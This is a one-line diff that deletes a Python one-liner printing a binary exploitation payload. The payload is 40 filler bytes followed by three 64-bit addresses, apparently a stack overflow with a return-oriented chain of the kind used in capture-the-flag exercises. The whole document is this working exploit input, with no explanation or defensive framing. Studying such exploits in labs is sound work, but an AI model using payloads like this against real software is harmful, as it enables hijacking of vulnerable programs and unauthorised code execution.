@@ -1,1 +1,0 @@
-python3 -c 'import sys; sys.stdout.buffer.write(b"a" * 40  + b"\xc3\x07\x40" + 5 * b"\x00" + b"\x60\x10\x60" + 5*b"\x00" + b"\x4b\x07\x40" + 5*b"\x00")'
